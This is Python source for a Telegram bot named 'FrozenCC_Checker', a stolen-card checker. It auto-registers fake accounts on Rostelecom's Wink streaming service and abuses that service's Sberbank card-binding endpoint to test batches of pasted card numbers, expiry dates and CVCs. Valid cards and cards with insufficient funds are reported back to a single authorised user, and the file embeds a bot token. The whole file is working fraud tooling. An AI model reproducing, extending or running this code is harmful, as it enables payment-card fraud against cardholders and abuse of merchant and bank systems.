import requests
from time import sleep
from random import choice
import telebot

def try_or(fn, df):
    try:
        return fn()
    except Exception as err:
        print(err)
        return df


def getUID():
    uid = "".join(choice("0123456789abcdefgh") for _ in range(16))
    f = requests.post(
        "https://cnt-odcv-itv02.svc.iptv.rt.ru/api/v2/itv/devices",
        json={
            "model": "".join(choice("0123456789abcdefgh") for _ in range(10)),
            "platform": "android",
            "real_uid": uid,
            "sn": uid,
            "terminal_name": "".join(choice("0123456789abcdefgh") for _ in range(16)),
            "type": "NCMOBILEANDROID",
            "vendor": "Bebra",
        },
        headers={
            "x-rt-uid": "",
            "x-rt-san": "",
            "user-agent": "WINK/1.34.1 (Android/11)",
        },
    )
    return f.json()["uid"]


def regAccount():
    email = "".join(choice("0123456789abcdefgh") for _ in range(10)) + "@gmail.com"
    ud = getUID()
    sess_id = requests.post(
        "https://cnt-odcv-itv02.svc.iptv.rt.ru/api/v2/itv/sessions",
        headers={
            "x-rt-uid": ud,
            "x-rt-san": "",
            "user-agent": "WINK/1.34.1 (Android/11)",
        },
        json={"device_uid": ud},
    ).json()["session_id"]
    san = requests.post(
        "https://cnt-odcv-itv02.svc.iptv.rt.ru/api/v2/user/accounts",
        headers={"User-Agent": "WINK/1.34.1 (Android/11)", "session_id": sess_id},
        json={"login": email, "login_type": "email", "password": "bebra228"},
    ).json()["san"]
    session_id = requests.post(
        "https://cnt-odcv-itv02.svc.iptv.rt.ru/api/v2/user/sessions",
        headers={"User-Agent": "WINK/1.34.1 (Android/11)", "session_id": sess_id},
        json={"login": email, "login_type": "email", "password": "bebra228"},
    ).json()["session_id"]
    return {"san": san, "session_id": session_id, "uid": ud}


def requestBuilderWink(url, data=None, params=None, json=None, method=None):
    bebra = regAccount()
    headers = {
        "User-Agent": "WINK/1.34.1 (Android/11)",
        "session_id": bebra["session_id"],
        "x-rt-uid": bebra["uid"],
        "x-rt-san": bebra["san"],
    }
    if method == "post":
        ff = lambda: requests.post(
            url,
            headers=headers,
            json=json,
        )
    else:
        ff = lambda: requests.get(
            url,
            headers=headers,
        )
    while True:
        kk = try_or(lambda: ff(), None)
        try:
            if data in kk.text:
                return kk.json()
            sleep(5)
        except Exception as err:
            print(err)


def getBind(card, mm, yy, cvc):
    data = requestBuilderWink(
        "https://vlg-srtv-itv02.svc.iptv.rt.ru/api/v2/user/bank_cards",
        data="order_id",
        method="post",
    )
    return requests.post(
        "https://securepayments.sberbank.ru:9001/rtk_binding/request",
        headers={
            "User-Agent": "WINK/1.34.1 (Android/11)",
            "Accept": "application/json, text/plain, */*",
            "Referer": "https://wink.rt.ru/my/payments",
            "Origin": "https://wink.rt.ru",
        },
        json={
            "authPay": {
                "orderId": data["order_id"],
                "payAmount": data["pay_amount"],
                "payCurrId": "RUB",
                "reqTime": "2021-09-15T01:00:37.314+04:00",
            },
            "cardCvc": str(cvc),
            "cardExpMonth": mm,
            "cardExpYear": int(f"20{yy}"),
            "cardHolder": "MARAT NEDOGIMOV",
            "cardNumber": str(card),
            "reqId": data["req_id"],
            "reqType": "cardRegister",
        },
    ).json()


def wink(card, mm, yy, cvc):
    bind = getBind(card, mm, yy, cvc)
    print(bind)
    if "reqNote" in bind:
       	print("невалид") 
        if bind['reqNote'] == "Недостаточно средств":
            return(card + "|" + mm + "|" + yy + "|" + cvc + "|" + "NOMONEY")
        else:
            return "Not"
    else:
        return(card + "|" + mm + "|" + yy + "|" + cvc + "|" + "Валид")


token = '2095845266:AAEPUpCuXgDcAlO1D49xmkVtRFxldcKM2Ic'

bot = telebot.TeleBot(token)

@bot.message_handler(commands=['start'])
def start_message(message):
    if message.chat.username == 'frozen_cvv':
        keyboard = telebot.types.ReplyKeyboardMarkup(True)
        keyboard.row('Проверить карты')
        bot.send_message(message.chat.id, 'Привет! Ты попал в бота FrozenCC_Checker', reply_markup=keyboard)
    else:
        bot.send_message(message.chat.id, 'Пшëл вон!!!!!!!!!!!')



@bot.message_handler(content_types=['text'])
def start_message(message):
    if message.text.lower() == 'проверить карты':
        bot.send_message(message.chat.id, 'Отправь до 150 cc')
    else:
        message1 = str(message.text)
        cc_list = message1.split("\n")
        print(cc_list)
        bot.send_message(message.chat.id, "карты приняты в обработку")
        count = 0
        for cc in cc_list: 
            cc = cc.split("|")
            a = wink(cc[0], cc[1], cc[2], cc[3])
            if a == "Not":
                print("Отправлено")
            else:
                bot.send_message(message.chat.id, a)
            count += 1
            if count == len(cc_list):
                bot.send_message(message.chat.id, "Карты проверены, можете загружать ещë")
            else:
                continue


bot.polling()